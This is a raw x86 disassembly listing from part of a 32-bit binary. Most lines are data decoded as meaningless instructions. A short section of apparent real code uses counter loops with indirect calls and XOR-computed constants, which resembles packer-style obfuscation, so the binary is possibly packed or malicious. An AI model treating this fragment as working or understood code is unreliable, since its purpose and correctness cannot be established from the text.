  40d97a:	mov    BYTE PTR [eax-0x7c392a4e],cl
  40d980:	fldcw  WORD PTR [esi-0x14]
  40d983:	pop    edi
  40d984:	jno    0x40d9e9
  40d986:	icebp  
  40d987:	loope  0x40d967
  40d989:	pop    eax
  40d98a:	ins    DWORD PTR es:[edi],dx
  40d98b:	or     bl,cl
  40d98d:	sbb    edx,DWORD PTR [edi-0xe5d1125]
  40d993:	or     BYTE PTR [eax-0x75834bbb],al
  40d999:	pop    ebx
  40d99a:	inc    eax
  40d99b:	adc    al,0xfd
  40d99d:	adc    BYTE PTR [edi+edi*2+0x1ea1880f],al
  40d9a4:	ror    DWORD PTR [edi-0x72fa73c1],0xb2
  40d9ab:	popf   
  40d9ac:	sub    dh,BYTE PTR [edx]
  40d9ae:	sbb    ebx,DWORD PTR [eax-0x1482720c]
  40d9b4:	cs cmp eax,0x27a759f6
  40d9ba:	xor    BYTE PTR [edi+0x6afd83b4],bl
  40d9c0:	outs   dx,BYTE PTR ds:[esi]
  40d9c1:	gs push 0x3825c956
  40d9c7:	cli    
  40d9c8:	repz cli 
  40d9ca:	bound  eax,QWORD PTR [ebp+0x3b10b886]
  40d9d0:	ins    BYTE PTR es:[edi],dx
  40d9d1:	or     DWORD PTR [edx-0x55],edx
  40d9d4:	pusha  
  40d9d5:	add    BYTE PTR [ebp-0x5a],al
  40d9d8:	sbb    al,0x61
  40d9da:	mov    bh,0xfa
  40d9dc:	pop    ecx
  40d9dd:	cdq    
  40d9de:	pusha  
  40d9df:	stos   BYTE PTR es:[edi],al
  40d9e0:	retf   
  40d9e1:	and    al,BYTE PTR [edx+0x6e]
  40d9e4:	sbb    al,0x25
  40d9e6:	push   esi
  40d9e7:	mov    al,0xe1
  40d9e9:	push   ebp
  40d9ea:	loop   0x40da44
  40d9ec:	mov    BYTE PTR [edx+0x136786c],al
  40d9f2:	mov    ecx,0xff24d75e
  40d9f7:	mov    edx,0x65d9925
  40d9fc:	lahf   
  40d9fd:	popa   
  40d9fe:	push   edi
  40d9ff:	inc    esp
  40da00:	mov    edi,0xeda867d7
  40da05:	adc    al,0x37
  40da07:	xlat   BYTE PTR ds:[ebx]
  40da08:	mov    bh,0x43
  40da0a:	loopne 0x40da09
  40da0c:	adc    ebp,DWORD PTR [edi]
  40da0e:	dec    ebx
  40da0f:	minps  xmm3,XMMWORD PTR [edx-0x9]
  40da13:	dec    ebp
  40da14:	and    bh,al
  40da16:	les    ebx,FWORD PTR [edx]
  40da18:	dec    edi
  40da19:	fcomp  QWORD PTR [ebx+0x15]
  40da1c:	adc    eax,0xa8826d04
  40da21:	mov    dl,0xd1
  40da23:	mov    ch,0xe8
  40da25:	push   eax
  40da26:	jo     0x40d9ed
  40da28:	add    DWORD PTR [edx],ebx
  40da2a:	jmp    0x40da77
  40da2c:	jg     0x40da5b
  40da2e:	sbb    dh,ch
  40da30:	jmp    0x97f3:0x6eb3fc95
  40da37:	nop
  40da38:	xor    edi,DWORD PTR [ebx+0x33]
  40da3b:	pop    ecx
  40da3c:	idiv   BYTE PTR [ecx-0x7e]
  40da3f:	cmc    
  40da40:	xchg   ebp,eax
  40da41:	dec    eax
  40da42:	ins    BYTE PTR es:[edi],dx
  40da43:	xchg   esi,eax
  40da44:	mov    ch,0x4a
  40da46:	les    ebx,FWORD PTR [edi+0x3e3d336e]
  40da4c:	sbb    al,0xeb
  40da4e:	mov    ebx,DWORD PTR [ebx-0x489d873c]
  40da54:	ret    0x854f
  40da57:	sar    BYTE PTR [ecx+0x7eb9c034],0x55
  40da5e:	xlat   BYTE PTR ds:[ebx]
  40da5f:	sti    
  40da60:	lea    esi,[ecx+0xe]
  40da63:	or     DWORD PTR [esi-0x2a],edi
  40da66:	js     0x40daaf
  40da68:	sbb    eax,0x766c216f
  40da6d:	rcr    BYTE PTR [ecx+0x1320bcb3],0xb
  40da74:	push   ss
  40da75:	pop    esi
  40da76:	push   0x9364d183
  40da7b:	leave  
  40da7c:	sbb    DWORD PTR [edx],edx
  40da7e:	xlat   BYTE PTR ds:[ebx]
  40da7f:	es call 0xfc72:0x4bf9d99e
  40da87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da88:	fisttp DWORD PTR [esi+0x10]
  40da8b:	mov    esi,DWORD PTR ds:0xd0cf7862
  40da91:	dec    eax
  40da92:	(bad)  
  40da93:	retf   0x108f
  40da96:	pop    ebp
  40da97:	enter  0x43af,0x9d
  40da9b:	jp     0x40dac9
  40da9d:	sub    al,0x7b
  40da9f:	add    bh,ah
  40daa1:	das    
  40daa2:	cmp    BYTE PTR [eax-0x37],al
  40daa5:	in     al,0xa8
  40daa7:	sbb    eax,0xa8ab2547
  40daac:	fidivr DWORD PTR [esi-0x8]
  40daaf:	test   DWORD PTR [edi+0x5bee5aa],edx
  40dab5:	mov    ?,WORD PTR [ebx-0x67]
  40dab8:	push   esi
  40dab9:	mov    cl,0x4e
  40dabb:	lahf   
  40dabc:	faddp  st(0),st
  40dabe:	jmp    0x40db00
  40dac0:	rol    BYTE PTR [eax+0x62602780],cl
  40dac6:	imul   edi,DWORD PTR [edx-0x1f672536],0xfffffffa
  40dacd:	in     eax,dx
  40dace:	int3   
  40dacf:	mov    DWORD PTR ds:0xbad8027b,ebx
  40dad5:	into   
  40dad6:	adc    BYTE PTR [ebp-0x72],ch
  40dad9:	inc    edx
  40dada:	mov    DWORD PTR [ebx-0x13f77a67],edx
  40dae0:	sbb    BYTE PTR [eax],ah
  40dae2:	or     ah,cl
  40dae4:	in     al,0xf3
  40dae6:	sbb    DWORD PTR [edx-0x100756d1],edi
  40daec:	pop    es
  40daed:	add    al,0x73
  40daef:	repnz loope 0x40dadb
  40daf2:	stc    
  40daf3:	jae    0x40daa5
  40daf5:	inc    edx
  40daf6:	int3   
  40daf7:	iret   
  40daf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daf9:	div    bh
  40dafb:	fwait
  40dafc:	xchg   edi,eax
  40dafd:	push   cs
  40dafe:	div    esp
  40db00:	mov    esi,0xfe120816
  40db05:	popf   
  40db06:	(bad)  
  40db07:	(bad)  
  40db08:	shl    BYTE PTR [edi],1
  40db0a:	push   0x66b56325
  40db0f:	fcmovnbe st,st(0)
  40db11:	js     0x40db5f
  40db13:	mov    ebx,0x3c6f5280
  40db18:	mov    eax,ds:0x42ff0f91
  40db1d:	in     al,dx
  40db1e:	mov    cl,0x8
  40db20:	push   esp
  40db21:	push   edi
  40db22:	mov    edx,DWORD PTR [edi-0x4301e86b]
  40db28:	enter  0x9206,0x14
  40db2c:	jae    0x40db6c
  40db2e:	and    BYTE PTR [ebx+0x7a],al
  40db31:	pop    ecx
  40db32:	sub    cl,bl
  40db34:	cdq    
  40db35:	pop    esp
  40db36:	push   ebx
  40db37:	adc    esi,DWORD PTR [ecx+ebx*4+0x4af20b41]
  40db3e:	inc    edx
  40db3f:	test   DWORD PTR [ebp-0x19d5edcd],0xc26721fe
  40db49:	pop    edi
  40db4a:	lss    ebx,FWORD PTR es:[eax-0x79]
  40db4f:	jb     0x40dba6
  40db51:	xor    BYTE PTR [edx-0xe],bh
  40db54:	mov    esi,DWORD PTR [ebx+eiz*4+0x58]
  40db58:	adc    bl,dh
  40db5a:	enter  0x3235,0x66
  40db5e:	jp     0x40db2c
  40db60:	add    eax,0xd29d3dd7
  40db65:	xchg   esp,eax
  40db66:	pop    edi
  40db67:	retf   
  40db68:	sub    DWORD PTR ds:0x72f52443,ecx
  40db6e:	inc    ebp
  40db6f:	jle    0x40dbd7
  40db71:	inc    edi
  40db72:	aad    0x75
  40db74:	mov    al,0xd8
  40db76:	enter  0xcd79,0x53
  40db7a:	(bad)  
  40db7b:	mov    ebp,0x61f3c070
  40db80:	lahf   
  40db81:	mov    ebp,0xcb2e7890
  40db86:	xor    ch,0xe2
  40db89:	addr16 into 
  40db8b:	dec    ebp
  40db8c:	jecxz  0x40dbc0
  40db8e:	in     al,0xc5
  40db90:	push   ebp
  40db91:	xchg   BYTE PTR [eax-0x53],dl
  40db94:	mov    esp,0xb60f06f4
  40db99:	pop    eax
  40db9a:	call   0x18a17999
  40db9f:	or     DWORD PTR [eax],0xfa82e26e
  40dba5:	adc    eax,0x179ce0b3
  40dbaa:	inc    esp
  40dbab:	mov    eax,0x526fcfa
  40dbb0:	mov    ds:0xc91851a7,eax
  40dbb5:	dec    ecx
  40dbb6:	and    al,0x7e
  40dbb8:	aad    0xf8
  40dbba:	xchg   esi,eax
  40dbbb:	int    0x82
  40dbbd:	push   eax
  40dbbe:	and    al,0xbf
  40dbc0:	mov    eax,ds:0x47dd320c
  40dbc5:	imul   DWORD PTR [esi+edi*8-0x21e758a0]
  40dbcc:	dec    edi
  40dbcd:	out    0xfb,eax
  40dbcf:	adc    eax,0x94cbf0b7
  40dbd4:	push   ecx
  40dbd5:	cmp    cl,dl
  40dbd7:	add    BYTE PTR [ecx],al
  40dbd9:	mov    cl,0x63
  40dbdb:	fdivr  QWORD PTR [esi+0x1c5dbbd5]
  40dbe1:	lods   eax,DWORD PTR ds:[esi]
  40dbe2:	lock sbb DWORD PTR [edi-0x6a],ebx
  40dbe6:	aaa    
  40dbe7:	mov    edi,0x42ff6b1f
  40dbec:	sub    ebp,DWORD PTR [ecx]
  40dbee:	cwde   
  40dbef:	icebp  
  40dbf0:	cmc    
  40dbf1:	leave  
  40dbf2:	das    
  40dbf3:	aad    0x96
  40dbf5:	push   esp
  40dbf6:	fs mov esp,0x32ac35f6
  40dbfc:	adc    DWORD PTR [eax+0x16],0xffffffa5
  40dc00:	or     DWORD PTR [esi+ebx*2],ebp
  40dc03:	jnp    0x40dc3d
  40dc05:	addr16 sbb eax,0xe050e823
  40dc0b:	(bad)  
  40dc0c:	fistp  WORD PTR [esi+0x52ba79b0]
  40dc12:	mov    bl,cl
  40dc14:	mov    eax,ds:0x68385330
  40dc19:	push   esp
  40dc1a:	leave  
  40dc1b:	and    al,0x54
  40dc1d:	cmp    eax,0x925b8cf1
  40dc22:	fs std 
  40dc24:	sub    ebx,DWORD PTR [ebp-0x10]
  40dc27:	std    
  40dc28:	ins    DWORD PTR es:[edi],dx
  40dc29:	mov    WORD PTR [ecx],cs
  40dc2b:	in     eax,dx
  40dc2c:	push   0xfffffff4
  40dc2e:	sti    
  40dc2f:	ds sti 
  40dc31:	scas   eax,DWORD PTR es:[edi]
  40dc32:	icebp  
  40dc33:	push   esi
  40dc34:	test   al,0xb0
  40dc36:	inc    ebx
  40dc37:	es popa 
  40dc39:	out    dx,al
  40dc3a:	mov    dl,BYTE PTR [ebx+0x2fb00475]
  40dc40:	cli    
  40dc41:	xor    eax,ebp
  40dc43:	sbb    BYTE PTR [ecx+0x6cd3734a],dh
  40dc49:	and    al,0x8d
  40dc4b:	push   edx
  40dc4c:	ret    
  40dc4d:	mov    dh,0x92
  40dc4f:	ins    DWORD PTR es:[edi],dx
  40dc50:	cmp    ebp,DWORD PTR [eax+0x6a00db49]
  40dc56:	and    al,0xd7
  40dc58:	add    eax,0xb06f9713
  40dc5d:	or     DWORD PTR [ebp+0x44c21960],eax
  40dc63:	push   es
  40dc64:	in     eax,0xe5
  40dc66:	cmc    
  40dc67:	mov    eax,ds:0xedc2c8c4
  40dc6c:	sub    eax,edx
  40dc6e:	bound  esi,QWORD PTR [ebx+0x1]
  40dc71:	push   DWORD PTR [esi-0x2]
  40dc74:	daa    
  40dc75:	out    0x80,al
  40dc77:	mov    DWORD PTR [eax-0x5ccc186e],0xd160d884
  40dc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc82:	aam    0xe9
  40dc84:	out    0x8e,eax
  40dc86:	sub    BYTE PTR [edx],dh
  40dc88:	jmp    0x75c84481
  40dc8d:	mov    edi,0xbf9dce73
  40dc92:	(bad)  [edx+0x23]
  40dc95:	mov    esp,DWORD PTR [eax]
  40dc97:	loopne 0x40dc7f
  40dc99:	and    ebx,DWORD PTR [edx+0x78]
  40dc9c:	mov    edx,0xe4235ef3
  40dca1:	lds    eax,FWORD PTR [edi]
  40dca3:	lods   eax,DWORD PTR ds:[esi]
  40dca4:	cmp    eax,0x23c8d9b4
  40dca9:	push   es
  40dcaa:	add    DWORD PTR [edx+0xfd71ec],esi
  40dcb0:	jae    0x40dd25
  40dcb2:	popa   
  40dcb3:	xchg   esp,eax
  40dcb4:	mov    esi,gs
  40dcb6:	call   0x1453:0x222db3bf
  40dcbd:	adc    al,0x57
  40dcbf:	cs xchg esp,eax
  40dcc1:	fbld   TBYTE PTR [ebx]
  40dcc3:	push   ebx
  40dcc4:	mov    ds:0x55f60495,eax
  40dcc9:	das    
  40dcca:	jnp    0x40dd3a
  40dccc:	jle    0x40dd1c
  40dcce:	xor    BYTE PTR [esi+0xb],cl
  40dcd1:	hlt    
  40dcd2:	arpl   WORD PTR [ebx-0x7f],bp
  40dcd5:	jae    0x40dcc9
  40dcd7:	mov    ds:0xd1b15c52,eax
  40dcdc:	mov    ss,WORD PTR [eax-0x2bdb5e3a]
  40dce2:	push   esi
  40dce3:	xor    edx,esp
  40dce5:	fistp  DWORD PTR [edi]
  40dce7:	loope  0x40dcfe
  40dce9:	adc    DWORD PTR [esi+ebx*4-0x29246ce7],eax
  40dcf0:	ins    BYTE PTR es:[edi],dx
  40dcf1:	mov    edi,0x99489530
  40dcf6:	repnz xor ebp,0x758cd383
  40dcfd:	push   ds
  40dcfe:	inc    al
  40dd00:	imul   ebx,DWORD PTR [ecx],0x6cfc7638
  40dd06:	popf   
  40dd07:	loopne 0x40dd2d
  40dd09:	mov    bl,0xb5
  40dd0b:	pop    edx
  40dd0c:	hlt    
  40dd0d:	sub    eax,0xaf3f2614
  40dd12:	mov    fs,WORD PTR [ebx+0x53]
  40dd15:	push   es
  40dd16:	pop    esi
  40dd17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd18:	mov    edx,0x581ce33
  40dd1d:	sbb    BYTE PTR [eax-0x5fffffbe],ah
  40dd23:	inc    edx
  40dd24:	add    BYTE PTR [ecx-0x30fc33bb],cl
  40dd2a:	jmp    0x4191e1
  40dd2f:	sub    DWORD PTR ds:0x42a018,edi
  40dd35:	lea    edx,[ecx+eax*1]
  40dd38:	mov    DWORD PTR [ebp-0x28],edx
  40dd3b:	mov    edx,DWORD PTR [ebp-0x44]
  40dd3e:	mov    ebx,DWORD PTR ds:0x429004
  40dd44:	add    DWORD PTR ds:0x42c008,ebx
  40dd4a:	sub    edx,ecx
  40dd4c:	mov    DWORD PTR ds:0x42b004,0x1e
  40dd56:	cmp    DWORD PTR ds:0x42b004,0x0
  40dd5d:	je     0x40dd97
  40dd63:	cmp    DWORD PTR ds:0x42b004,0x28
  40dd6a:	jne    0x40dd85
  40dd70:	push   0x3a6a
  40dd75:	push   0x42b010
  40dd7a:	push   0x42365e
  40dd7f:	call   DWORD PTR ds:0x424048
  40dd85:	mov    ebx,DWORD PTR ds:0x42b004
  40dd8b:	dec    ebx
  40dd8c:	mov    DWORD PTR ds:0x42b004,ebx
  40dd92:	jmp    0x40dd56
  40dd97:	mov    DWORD PTR [ebp-0x24],edx
  40dd9a:	mov    edx,DWORD PTR [ebp-0x24]
  40dd9d:	and    DWORD PTR ds:0x428008,edi
  40dda3:	mov    DWORD PTR [ebp-0x14],edx
  40dda6:	not    edx
  40dda8:	mov    edx,DWORD PTR [ebp-0x28]
  40ddab:	mov    DWORD PTR ds:0x42800c,0x11
  40ddb5:	cmp    DWORD PTR ds:0x42800c,0x0
  40ddbc:	je     0x40de6b
  40ddc2:	cmp    DWORD PTR ds:0x42800c,0x8
  40ddc9:	jne    0x40dddd
  40ddcf:	push   0x42a010
  40ddd4:	push   DWORD PTR [ebp-0x28]
  40ddd7:	call   DWORD PTR ds:0x424014
  40dddd:	cmp    DWORD PTR ds:0x42800c,0x9
  40dde4:	jne    0x40ddf7
  40ddea:	mov    ebx,DWORD PTR ds:0x42800c
  40ddf0:	dec    ebx
  40ddf1:	mov    DWORD PTR ds:0x42800c,ebx
  40ddf7:	xor    ebx,ebx
  40ddf9:	or     ebx,DWORD PTR ds:0x42800c
  40ddff:	dec    ebx
  40de00:	mov    DWORD PTR ds:0x42800c,ebx
  40de06:	jmp    0x40ddb5
  40de0b:	mov    DWORD PTR ds:0x429004,0x17
  40de15:	cmp    DWORD PTR ds:0x429004,0x0
  40de1c:	je     0x40de6b
  40de22:	cmp    DWORD PTR ds:0x429004,0x25
  40de29:	jne    0x40de57
  40de2f:	push   0x85b6
  40de34:	push   0x42a018
  40de39:	push   DWORD PTR [ebp-0x24]
  40de3c:	push   0x42c000
  40de41:	push   0x5138
  40de46:	push   DWORD PTR [ebp-0x24]
  40de49:	push   0x4b55
  40de4e:	push   DWORD PTR [ebp-0x24]
  40de51:	call   DWORD PTR ds:0x424018
  40de57:	xor    ebx,ebx
  40de59:	add    ebx,DWORD PTR ds:0x429004
  40de5f:	dec    ebx
  40de60:	mov    DWORD PTR ds:0x429004,ebx
  40de66:	jmp    0x40de15
  40de6b:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  40de72:	mov    DWORD PTR [ebp-0x40],edx
  40de75:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  40de7c:	mov    edx,DWORD PTR [ebp-0x3c]
  40de7f:	xor    edx,esi
  40de81:	add    edx,edi
  40de83:	mov    DWORD PTR [ebp-0x10],edx
  40de86:	mov    edx,DWORD PTR [ebp-0x3c]
  40de89:	xor    edx,esi
  40de8b:	add    edx,edi
  40de8d:	mov    DWORD PTR [ebp-0x8],edx
  40de90:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  40de97:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  40de9e:	mov    edx,DWORD PTR [ebp-0x3c]
  40dea1:	mov    ebx,DWORD PTR [ebp-0x14]
  40dea4:	xor    edx,esi
  40dea6:	add    edx,edi
  40dea8:	cmp    ebx,edx
  40deaa:	je     0x4191d5
  40deb0:	mov    eax,DWORD PTR [ebp-0x18]
  40deb3:	xor    eax,esi
  40deb5:	mov    edx,0xffcd8d25
  40deba:	sub    edx,eax
  40debc:	add    edx,DWORD PTR [ebp-0x14]
  40debf:	mov    eax,DWORD PTR [ebp-0x18]
  40dec2:	mov    ebx,DWORD PTR [ebp-0x10]
  40dec5:	xor    eax,esi
  40dec7:	jmp    0x41023c
  40decc:	and    ecx,DWORD PTR [eax+0x3]
  40decf:	scas   eax,DWORD PTR es:[edi]
  40ded0:	jecxz  0x40df3d
  40ded2:	arpl   sp,ax
  40ded4:	jns    0x40de7a
  40ded6:	cmp    edi,edi
  40ded8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ded9:	mov    ds:0xd1171177,al
  40dede:	bound  esp,QWORD PTR [edx+0xa]
  40dee1:	pop    edi
  40dee2:	bound  esp,QWORD PTR [edx-0x3]
  40dee5:	or     ecx,DWORD PTR [ebp-0x1d]
  40dee8:	js     0x40dec0
  40deea:	xchg   edi,eax
  40deeb:	xlat   BYTE PTR ds:[ebx]
  40deec:	fwait
  40deed:	sbb    DWORD PTR [eax],ebx
  40deef:	aad    0x6
  40def1:	mov    cl,0x36
  40def3:	jbe    0x40ded1
  40def5:	and    ch,BYTE PTR [ebp+esi*1+0x2ed35de1]
  40defc:	pop    ds
  40defd:	jno    0x40decf
  40deff:	cmp    al,0xaa
  40df01:	inc    ebx
  40df02:	call   0x5a94:0x62ef49eb
  40df09:	xlat   BYTE PTR ds:[ebx]
  40df0a:	pop    ss
  40df0b:	fldenv [esi+0x5a5f9328]
  40df11:	out    dx,al
  40df12:	push   es
  40df13:	xchg   edx,eax
  40df14:	dec    eax
  40df15:	sbb    eax,0xbfac9a4c
  40df1a:	and    al,0xd1
  40df1c:	or     al,0x8b
  40df1e:	xchg   esp,eax
  40df1f:	push   0xffffff8a
  40df21:	jo     0x40df0f
  40df23:	xor    al,0x27
  40df25:	inc    edx
  40df26:	sbb    ah,BYTE PTR [ebx-0x9a955f4]
  40df2c:	dec    eax
  40df2d:	push   ebx
  40df2e:	adc    al,0x57
  40df30:	adc    dl,BYTE PTR [edx+0x46]
  40df33:	mov    eax,0x10b4cb3
  40df38:	mov    ss,WORD PTR [ebp-0x6f34ede4]
  40df3e:	sub    eax,0x408617f6
  40df43:	pop    edi
  40df44:	and    al,0xed
  40df46:	aaa    
  40df47:	test   DWORD PTR [esi-0x43dbd48a],esp
  40df4d:	pop    esp
  40df4e:	fimul  WORD PTR [ecx]
  40df50:	sub    BYTE PTR [eax-0x52263e0d],0x2c
  40df57:	pop    edi
  40df58:	push   0xffffffe2
  40df5a:	mov    bl,0x83
  40df5c:	aam    0xb9
  40df5e:	dec    ecx
  40df5f:	sbb    BYTE PTR [edi+0x6b191759],0x49
  40df66:	cwde   
  40df67:	or     al,0x48
  40df69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df6a:	or     al,0x78
  40df6c:	cmp    ah,BYTE PTR [ebp-0x46a8d11a]
  40df72:	dec    DWORD PTR [ecx+0x606a27f]
  40df78:	int    0x8c
  40df7a:	lods   eax,DWORD PTR ds:[esi]
  40df7b:	cld    
  40df7c:	retf   
  40df7d:	(bad)
  40df82:	pop    bx
  40df84:	xor    DWORD PTR [ecx+0x23],eax
  40df87:	aad    0x7a
  40df89:	dec    esp
  40df8a:	sub    al,0x10
  40df8c:	jo     0x40dfa2
  40df8e:	mov    ch,BYTE PTR ds:0xc90a8cca
  40df94:	xchg   edx,eax
  40df95:	out    0xf4,eax
  40df97:	push   eax
  40df98:	fstp   TBYTE PTR [eax-0x670738bc]
  40df9e:	test   DWORD PTR [ebx-0x63b85925],esp
  40dfa4:	dec    esi
  40dfa5:	cmp    eax,0x21ff03c5
  40dfaa:	cmp    edx,DWORD PTR [eax]
  40dfac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfad:	cli    
  40dfae:	xor    BYTE PTR [ebx],0x41
  40dfb1:	push   cs
  40dfb2:	pop    ebx
  40dfb3:	inc    ecx
  40dfb4:	and    al,0x5a
  40dfb6:	add    BYTE PTR [ecx+0x775f38a0],ch
  40dfbc:	ret    0xf7b
  40dfbf:	inc    esi
  40dfc0:	out    dx,eax
  40dfc1:	pop    esp
  40dfc2:	inc    esi
  40dfc3:	enter  0xb1ab,0x61
  40dfc7:	test   al,0x56
  40dfc9:	in     al,0xaa
  40dfcb:	sub    BYTE PTR [ecx-0x14b9ff98],ch
  40dfd1:	cld    
  40dfd2:	dec    ecx
  40dfd3:	dec    esp
  40dfd4:	(bad)  
  40dfd5:	int3   
  40dfd6:	out    dx,eax
  40dfd7:	dec    esi
  40dfd8:	mov    al,bl
  40dfda:	mov    eax,0xae3fe4c6
  40dfdf:	not    BYTE PTR [edx]
  40dfe1:	clc    
  40dfe2:	xchg   edx,eax
  40dfe3:	jns    0x40dffb
  40dfe5:	jmp    0x9957414
  40dfea:	pop    es
  40dfeb:	cld    
  40dfec:	or     DWORD PTR [esi],edx
  40dfee:	pop    edi
  40dfef:	xor    eax,0xcc38b78c
  40dff4:	jmp    0x40e048
  40dff6:	inc    eax
  40dff7:	outs   dx,BYTE PTR ds:[esi]
  40dff8:	retf   0x308a
  40dffb:	jp     0x40e073
  40dffd:	test   eax,0x7c3c38c5
  40e002:	out    0xd6,eax
  40e004:	sti    
  40e005:	adc    al,0x1
  40e007:	fstp   DWORD PTR [ebx-0x2f8b9730]
  40e00d:	js     0x40e07a
  40e00f:	dec    ebx
  40e010:	cmp    al,0x92
  40e012:	int    0xfc
  40e014:	dec    ebp
  40e015:	push   0xffffff8a
  40e017:	mov    ah,0x32
  40e019:	cmp    dl,BYTE PTR [ebx+0xd5c7553]
  40e01f:	add    bh,BYTE PTR [edi-0x5574eb74]
  40e025:	shl    BYTE PTR [eax-0x14],1
  40e028:	(bad)  
  40e029:	fisubr DWORD PTR [edx-0x9]
  40e02c:	inc    ecx
  40e02d:	popa   
  40e02e:	xlat   BYTE PTR ds:[ebx]
  40e02f:	or     BYTE PTR [ebx],0x46
  40e032:	repnz pushf 
  40e034:	(bad)  [eax-0x2f]
  40e037:	add    BYTE PTR [eax+ebx*8+0x11],0xfb
  40e03c:	xor    eax,0x60b5ce15
  40e041:	mov    eax,ds:0xdb56ae96
  40e046:	add    al,0x2c
  40e048:	popf   
  40e049:	ss ret 
  40e04b:	jge    0x40e092
  40e04d:	jecxz  0x40e028
  40e04f:	sbb    eax,0xdd0c3127
  40e054:	aaa    
  40e055:	cwde   
  40e056:	lods   al,BYTE PTR ds:[esi]
  40e057:	or     dl,BYTE PTR [esi+0xc]
  40e05a:	scas   al,BYTE PTR es:[edi]
  40e05b:	mov    dl,0x3a
  40e05d:	or     BYTE PTR [esi],0x17
  40e060:	scas   al,BYTE PTR es:[edi]
  40e061:	stos   BYTE PTR es:[edi],al
  40e062:	iret   
  40e063:	mov    DWORD PTR [ebp+esi*8+0x5863783d],ebp
  40e06a:	and    ebp,edi
  40e06c:	jmp    0x40e0eb
  40e06e:	mov    ebp,0xff998fa5
  40e073:	pushf  
  40e074:	and    eax,0x692be03a
  40e079:	scas   al,BYTE PTR es:[edi]
  40e07a:	push   ebp
  40e07b:	inc    ecx
  40e07c:	jo     0x40e03b
  40e07e:	or     DWORD PTR [ecx],edx
  40e080:	neg    edx
  40e082:	mov    al,ds:0x81e23c8f
  40e087:	arpl   WORD PTR [edx+ecx*4],bp
  40e08a:	xchg   edi,eax
  40e08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e08c:	or     bh,BYTE PTR [eax]
  40e08e:	and    esp,ecx
  40e090:	aaa    
  40e091:	out    0x9,al
  40e093:	xor    ebp,edi
  40e095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e096:	ds iret 
  40e098:	jmp    0xce2c:0x9eb68188
  40e09f:	sbb    al,0x9e
  40e0a1:	ja     0x40e053
  40e0a3:	out    0x80,eax
  40e0a5:	mov    dh,0x9b
  40e0a7:	lods   eax,DWORD PTR ds:[esi]
  40e0a8:	sbb    ecx,edx
  40e0aa:	mov    dl,cl
  40e0ac:	xchg   BYTE PTR [ebx+0x4c597ccd],dl
  40e0b2:	ins    DWORD PTR es:[edi],dx
  40e0b3:	dec    esp
  40e0b4:	xlat   BYTE PTR ds:[ebx]
  40e0b5:	lods   al,BYTE PTR ds:[esi]
  40e0b6:	(bad)  [eax+0x4a]
  40e0b9:	push   eax
  40e0ba:	fnstcw WORD PTR [ebx+ecx*8-0x2d]
  40e0be:	jmp    0x40e0f3
  40e0c0:	xchg   DWORD PTR [edi+0x5e4e8970],esi
  40e0c6:	or     dh,BYTE PTR [esi]
  40e0c8:	aaa    
  40e0c9:	sar    BYTE PTR [esi-0x441fa7f4],cl
  40e0cf:	hlt    
  40e0d0:	dec    edi
  40e0d1:	jecxz  0x40e053
  40e0d3:	jo     0x40e0eb
  40e0d5:	sahf   
  40e0d6:	mov    ch,0x15
  40e0d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0d9:	pop    ecx
  40e0da:	push   es
  40e0db:	scas   eax,DWORD PTR es:[edi]
  40e0dc:	jbe    0x40e0f5
  40e0de:	inc    eax
  40e0df:	fs xchg ebx,eax
  40e0e1:	ja     0x40e0b8
  40e0e3:	(bad)  
  40e0e4:	or     al,0xbb
  40e0e6:	pop    edi
  40e0e7:	in     al,0x6f
  40e0e9:	xchg   ebp,eax
  40e0ea:	push   ecx
  40e0eb:	icebp  
  40e0ec:	pop    ecx
  40e0ed:	mov    dl,0xfc
  40e0ef:	inc    edi
  40e0f0:	aam    0x8
  40e0f2:	jge    0x40e15a
  40e0f4:	test   ecx,esp
  40e0f6:	enter  0xd335,0xb
  40e0fa:	sti    
  40e0fb:	or     DWORD PTR [ebx],esi
  40e0fd:	xor    DWORD PTR [ebx+0x52],edx
  40e100:	sub    ebp,DWORD PTR [eax-0x2cc4f64d]
  40e106:	imul   edx,DWORD PTR ds:0xf7f67829,0xffffff9d
  40e10d:	in     eax,0xe
  40e10f:	add    BYTE PTR [esi+0x1ab1ade2],bl
  40e115:	xchg   BYTE PTR [esi+0x59969cb],bl
  40e11b:	or     edx,ebx
  40e11d:	lahf   
  40e11e:	(bad)  
  40e11f:	sbb    esp,DWORD PTR [edx+0x3d78c1cb]
  40e125:	fs fwait
  40e127:	das    
  40e128:	ret    
  40e129:	sbb    eax,0x1c785d42
  40e12e:	outs   dx,BYTE PTR ds:[esi]
  40e12f:	push   edi
  40e130:	(bad)  
  40e131:	cli    
  40e132:	mov    al,0xdb
  40e134:	adc    DWORD PTR [edx+0x46],edi
  40e137:	or     esp,DWORD PTR [edx-0x2761f42b]
  40e13d:	sub    dl,BYTE PTR [edi+0x5fccfd69]
  40e143:	mov    ds:0xb668528,al
  40e148:	xchg   edx,eax
  40e149:	(bad)  
  40e14a:	pop    ss
  40e14b:	push   eax
  40e14c:	mov    ?,WORD PTR [ebx+eiz*1-0x45]
  40e150:	js     0x40e1cf
  40e152:	iret   
  40e153:	fimul  DWORD PTR [ebp+0x7e4f3ff7]
  40e159:	fsub   DWORD PTR [edi-0x4f]
  40e15c:	push   edx
  40e15d:	lock call 0xb7cc69c4
  40e163:	xlat   BYTE PTR ds:[ebx]
  40e164:	xor    bh,BYTE PTR ds:0xcbc2aa32
  40e16a:	pop    esp
  40e16b:	cmp    dl,BYTE PTR [esi]
  40e16d:	daa    
  40e16e:	push   ecx
  40e16f:	mov    ch,0x6d
  40e171:	mov    edi,0xe95f5603
  40e176:	cmp    DWORD PTR [edi],edx
  40e178:	loop   0x40e194
  40e17a:	clc    
  40e17b:	in     eax,0x2a
  40e17d:	xor    eax,0x6f4ea572
  40e182:	jl     0x40e1f3
